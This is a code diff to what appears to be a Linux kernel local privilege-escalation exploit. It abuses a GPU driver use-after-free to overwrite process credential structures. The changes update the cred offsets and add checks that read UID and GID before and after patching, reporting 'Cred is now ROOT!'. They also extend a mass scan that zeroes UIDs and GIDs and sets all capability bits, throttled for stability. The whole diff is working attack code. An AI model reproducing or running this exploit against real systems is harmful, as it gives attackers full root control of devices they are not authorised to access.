@@ -32,8 +32,8 @@
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
 #define OFFSET_COMM          0x818
-#define OFFSET_CRED          0x870
-#define OFFSET_REAL_CRED     0x878
+#define OFFSET_CRED          0x6b0
+#define OFFSET_REAL_CRED     0x6b8
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -1157,6 +1157,12 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
          fprintf(stderr, "[GPU_CRED] Warning: Address 0x%lx looks unusual, but patching anyway.\n", (unsigned long)cred_ptr);
     }
 
+    uint32_t before[3], after[3];
+    if (gpu_read_task_struct(fd, cred_ptr, (uint8_t *)before, 12) == 0) {
+        fprintf(stderr, "[GPU_CRED] BEFORE: VA=0x%lx UID=%u GID=%u usage=%u\n", 
+                (unsigned long)cred_ptr, before[1], before[2], before[0]);
+    }
+
     fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx via GPU\n", (unsigned long)cred_ptr);
 
     uint8_t zero_creds[32] = {0};
@@ -1168,29 +1174,34 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 
     if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
     {
-        if (gpu_write_task_virt(fd, real_cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0)
-            return -1;
+        gpu_write_task_virt(fd, real_cred_ptr + 4, zero_creds, sizeof(zero_creds));
     }
 
     // Patch capabilities to all 1s (0xff)
     uint8_t all_caps[32];
     memset(all_caps, 0xff, 32);
-    // Common offsets for capabilities in struct cred:
-    // cap_inheritable (0x30), cap_permitted (0x38), cap_effective (0x40), cap_bset (0x48), cap_ambient (0x50)
-    if (gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32) != 0) {
-        fprintf(stderr, "[GPU_CRED] FAILED to patch CAPS at 0x%lx\n", (unsigned long)cred_ptr + 0x30);
-    }
+    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32);
     
     if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
         gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 32);
 
-    fprintf(stderr, "[GPU_CRED] Patching complete.\n");
+    if (gpu_read_task_struct(fd, cred_ptr, (uint8_t *)after, 12) == 0) {
+        fprintf(stderr, "[GPU_CRED] AFTER : VA=0x%lx UID=%u GID=%u usage=%u\n", 
+                (unsigned long)cred_ptr, after[1], after[2], after[0]);
+        if (after[1] == 0 && after[2] == 0) {
+            fprintf(stderr, "[GPU_CRED] [+] VERIFICATION SUCCESS: Cred is now ROOT!\n");
+        } else {
+            fprintf(stderr, "[GPU_CRED] [!] VERIFICATION FAILED: UID is still %u\n", after[1]);
+        }
+    }
+
     return 0;
 }
 
 static int mass_patch_creds(int fd, uint32_t target_uid) {
     fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
     int patch_count = 0;
+    int max_patches = 1000; // Stability: limit patches per scan
     uint8_t *page = malloc(PAGE_SIZE);
     
     // Scan all pages in the UAF range
@@ -1206,7 +1217,16 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                 
                 // Refined CRED pattern: usage > 0, UID == GID == target_uid
                 if (usage >= 1 && usage <= 255 && ruid == target_uid && rgid == target_uid && suid == target_uid && sgid == target_uid) {
-                    fprintf(stderr, "[PARENT] Found CRED candidate at 0x%lx (off 0x%x). Patching...\n", (unsigned long)va, off);
+                    // One final check: usage 0 is suspicious, already patched is pointless
+                    if (ruid == 0) continue; 
+
+                    patch_count++;
+                    if (patch_count > max_patches) break;
+
+                    if (patch_count % 100 == 0) {
+                        fprintf(stderr, "[PARENT] Patched %d structures...\n", patch_count);
+                        usleep(10000); // Throttling for stability
+                    }
                     
                     uint8_t zero_creds[32] = {0};
                     gpu_write_task_virt(fd, va + off + 4, zero_creds, 32);
@@ -1214,11 +1234,10 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                     uint8_t all_caps[32];
                     memset(all_caps, 0xff, 32);
                     gpu_write_task_virt(fd, va + off + 0x30, all_caps, 32);
-                    
-                    patch_count++;
                 }
             }
         }
+        if (patch_count > max_patches) break;
     }
     
     free(page);
